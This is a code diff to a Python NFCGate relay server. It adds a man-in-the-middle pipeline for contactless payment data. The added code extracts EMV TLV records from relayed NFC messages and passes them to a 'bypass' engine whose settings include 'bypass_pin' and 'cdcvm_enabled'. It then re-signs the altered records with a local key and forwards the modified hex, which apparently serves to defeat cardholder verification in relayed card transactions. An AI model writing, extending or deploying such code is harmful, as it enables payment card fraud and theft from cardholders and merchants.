@@ -17,10 +17,33 @@ from typing import Dict, List, Optional, Tuple, Any
 from datetime import datetime
 from pathlib import Path
 import logging
+import sys
+from binascii import unhexlify
 
 # Setup logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
+
+# Try to make project src importable for MITM pipeline
+try:
+    from pathlib import Path as _Path
+    _project_root = _Path(__file__).parent
+    if str(_project_root) not in sys.path:
+        sys.path.insert(0, str(_project_root))
+    # Import MITM components
+    from src.core.tlv_parser import parse_tlv, build_tlv
+    from src.core.crypto_handler import (
+        sign_data,
+        add_signature_to_tlvs,
+        load_or_generate_private_key,
+    )
+    from src.core.payment_detector import get_scheme_from_tlvs, detect_terminal_type
+    from src.mitm.bypass_engine import bypass_tlv_modifications
+    _HAVE_MITM = True
+    logger.debug("MITM components loaded for NFCGate server")
+except Exception as _e:
+    _HAVE_MITM = False
+    logger.warning(f"MITM components not available: {_e}")
 
 class NFCGateProtocol:
     """NFCGate protocol handler for Android APK compatibility"""
@@ -640,6 +663,13 @@ class NFCGateServer:
         self.clients = {}  # client_socket -> client_info
         self.devices = {}  # device_id -> NFCDevice
         self.sessions = {}  # session_id -> session_info
+        # MITM state and key (lazy-loaded)
+        self._mitm_state = {
+            'bypass_pin': True,
+            'cdcvm_enabled': True,
+            'block_all': False,
+        }
+        self._private_key = None
         self.message_handlers = {
             NFCGateProtocol.MESSAGE_TYPES['INIT']: self.handle_init,
             NFCGateProtocol.MESSAGE_TYPES['NFC_DATA']: self.handle_nfc_data,
@@ -840,6 +870,21 @@ class NFCGateServer:
                 processed_data = self.process_emulator_data(nfc_data, device)
             else:
                 processed_data = nfc_data
+
+            # Attempt TLV MITM pipeline if available and input looks TLV-like
+            mitm_result = None
+            if _HAVE_MITM:
+                try:
+                    mitm_result = self._apply_tlv_mitm(nfc_data)
+                except Exception as e:
+                    logger.warning(f"MITM TLV processing failed: {e}")
+                    mitm_result = None
+            if mitm_result:
+                # Attach MITM results; do not discard original payload
+                processed_data['mitm'] = mitm_result
+                # Convenience: expose modified TLV as top-level too
+                if 'modified_tlv_hex' in mitm_result:
+                    processed_data['modified_tlv_hex'] = mitm_result['modified_tlv_hex']
             
             # Add metadata
             processed_data.update({
@@ -1113,6 +1158,97 @@ class NFCGateServer:
         })
         
         return processed
+
+    # --- MITM helpers ---
+    def _ensure_private_key(self) -> None:
+        if self._private_key is None:
+            try:
+                # Use project-default key path
+                self._private_key = load_or_generate_private_key('keys/private.pem')
+            except Exception as e:
+                logger.warning(f"Private key unavailable for signing: {e}")
+                self._private_key = None
+
+    @staticmethod
+    def _looks_hex(s: str) -> bool:
+        try:
+            if not isinstance(s, str):
+                return False
+            if len(s) % 2 != 0:
+                return False
+            unhexlify(s)
+            return True
+        except Exception:
+            return False
+
+    def _extract_tlv_bytes(self, nfc_data: Dict[str, Any]) -> Optional[bytes]:
+        """Extract TLV bytes from various possible fields in incoming JSON."""
+        # Preferred fields: explicit TLV hex or raw data hex
+        for key in ('raw_tlv_hex', 'raw_data', 'tlv_hex'):
+            val = nfc_data.get(key)
+            if isinstance(val, str) and self._looks_hex(val):
+                return unhexlify(val)
+        # Base64-encoded TLV bytes
+        b64 = nfc_data.get('tlv_bytes_b64')
+        if isinstance(b64, str):
+            try:
+                return base64.b64decode(b64)
+            except Exception:
+                pass
+        # Build from TLV key:value string (e.g., "5A:11223344|50:VISA")
+        tlv_string = nfc_data.get('tlv_data')
+        if isinstance(tlv_string, str) and tlv_string:
+            tlvs_list = []
+            try:
+                for pair in tlv_string.split('|'):
+                    if ':' not in pair:
+                        continue
+                    tag_str, val_str = pair.split(':', 1)
+                    tag_int = int(tag_str, 16)
+                    if self._looks_hex(val_str):
+                        val_bytes = unhexlify(val_str)
+                    else:
+                        val_bytes = val_str.encode('utf-8', errors='ignore')
+                    tlvs_list.append({'tag': tag_int, 'value': val_bytes, 'children': None})
+                if tlvs_list:
+                    return build_tlv(tlvs_list)
+            except Exception as e:
+                logger.debug(f"Failed to build TLV from tlv_data: {e}")
+        return None
+
+    def _apply_tlv_mitm(self, nfc_data: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+        """Apply TLV MITM pipeline: parse -> bypass -> sign -> rebuild."""
+        tlv_bytes = self._extract_tlv_bytes(nfc_data)
+        if not tlv_bytes:
+            return None
+        # Parse TLVs
+        tlvs = parse_tlv(tlv_bytes)
+        # Detect scheme and terminal type
+        scheme = get_scheme_from_tlvs(tlvs)
+        terminal_type = detect_terminal_type(tlvs)
+        # Apply bypass
+        modified_tlvs = bypass_tlv_modifications(tlvs, scheme, terminal_type, self._mitm_state)
+        if modified_tlvs is None:
+            return {'blocked': True, 'reason': 'block_all'}
+        unsigned = build_tlv(modified_tlvs)
+        # Sign (if key available)
+        self._ensure_private_key()
+        signature_added = False
+        if self._private_key is not None:
+            try:
+                signature = sign_data(unsigned, self._private_key)
+                modified_tlvs = add_signature_to_tlvs(modified_tlvs, signature)
+                signature_added = True
+            except Exception as e:
+                logger.debug(f"Signing failed, continuing without signature: {e}")
+        final_bytes = build_tlv(modified_tlvs)
+        return {
+            'mitm_applied': True,
+            'scheme': scheme,
+            'terminal_type': terminal_type,
+            'signature_added': signature_added,
+            'modified_tlv_hex': final_bytes.hex(),
+        }
         
     def parse_tlv_data(self, tlv_string: str) -> Dict[str, str]:
         """Parse TLV data string"""
